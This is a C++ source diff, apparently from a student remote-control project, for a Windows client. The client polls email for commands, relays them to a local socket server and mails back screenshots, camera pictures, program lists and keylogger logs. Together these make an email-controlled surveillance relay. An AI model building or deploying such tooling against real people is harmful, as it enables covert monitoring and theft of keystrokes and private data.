@@ -1,23 +1,113 @@
 #include "../Application/lib.h"
 #include "../Application/checkCommand.h"
+#include <filesystem>
+
+const string saveDir = "C:/Users/Tien/Documents/RecieveFromServer/";
+
+SOCKET connect_to_server(const std::string &host, int port) {
+  WSADATA wsa;
+  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+    std::cerr << "[Client] WSAStartup failed: " << WSAGetLastError() << "\n";
+    return INVALID_SOCKET;
+  }
+
+  SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+  if (sock == INVALID_SOCKET) {
+    std::cerr << "[Client] Socket creation failed: " << WSAGetLastError()
+              << "\n";
+    WSACleanup();
+    return INVALID_SOCKET;
+  }
+
+  sockaddr_in serverAddr{};
+  serverAddr.sin_family = AF_INET;
+  serverAddr.sin_port = htons(port);
+  inet_pton(AF_INET, host.c_str(), &serverAddr.sin_addr);
+
+  if (connect(sock, (sockaddr *)&serverAddr, sizeof(serverAddr)) ==
+      SOCKET_ERROR) {
+    std::cerr << "[Client] Connection failed: " << WSAGetLastError() << "\n";
+    closesocket(sock);
+    WSACleanup();
+    return INVALID_SOCKET;
+  }
+
+  std::cout << "[Client] Connected to server " << host << ":" << port << "\n";
+  return sock;
+}
+
+// Nhận file từ server
+void receive_file(SOCKET sock, const std::string &filename) {
+  std::filesystem::create_directories(saveDir);
+
+  size_t fileSize;
+  recv(sock, reinterpret_cast<char *>(&fileSize), sizeof(fileSize), 0);
+
+  if (fileSize == 0) {
+    std::cerr << "[Client] No file received.\n";
+    return;
+  }
+
+  std::ofstream file(saveDir + filename, std::ios::binary);
+  char buffer[4096];
+  size_t bytesReceived = 0;
+
+  while (bytesReceived < fileSize) {
+    int chunk = recv(sock, buffer, sizeof(buffer), 0);
+    if (chunk <= 0) break;
+    file.write(buffer, chunk);
+    bytesReceived += chunk;
+  }
+
+  std::cout << "[Client] File received: " << saveDir + filename << " ("
+            << bytesReceived << " bytes)\n";
+}
 
 static std::atomic<bool> running(true);
 
+std::map<std::string, std::pair<std::string, std::string>> fileCommands = {
+    {"get_screenshot", {"Screenshot from server", saveDir + "screenshot.png"}},
+    {"get_picture", {"Picture from server", saveDir + "picture.png"}},
+    {"list_program", {"Program list from server", saveDir + "programs.txt"}},
+    {"keylogger", {"Keylogger log from server", saveDir + "keylog.txt"}}};
+
 void signal_handler(int) { running.store(false); }
+
+void process_command(const std::string &command,
+                     const std::string &senderEmail) {
+  SOCKET sock = connect_to_server("127.0.0.1", 8888);
+  if (sock == INVALID_SOCKET) {
+    std::cerr << "[Client] Could not connect to server\n";
+    return;
+  }
+
+  std::string payload = senderEmail + "\n" + command;
+  send(sock, payload.c_str(), payload.size(), 0);
+
+  if (fileCommands.count(command)) {
+    auto [subject, localFile] = fileCommands[command];
+    receive_file(sock, localFile);
+    send_email_with_attachment(senderEmail, subject,
+                               "Requested file from server", localFile);
+  }
+
+  closesocket(sock);
+}
 
 int main() {
   std::signal(SIGINT, signal_handler);
   std::signal(SIGTERM, signal_handler);
 
   curl_global_init(CURL_GLOBAL_DEFAULT);
-  cout << "[Agent] Email polling agent started." << endl;
 
   while (running.load()) {
-    check_email_commands();
-    std::this_thread::sleep_for(std::chrono::seconds(15));
+    auto commands = fetch_email_commands();
+    for (auto &[cmd, senderEmail] : commands) {
+      process_command(cmd, senderEmail);
+    }
+    std::this_thread::sleep_for(std::chrono::seconds(10));
   }
 
-  cout << "[Agent] Shutting down." << endl;
   curl_global_cleanup();
   return 0;
 }
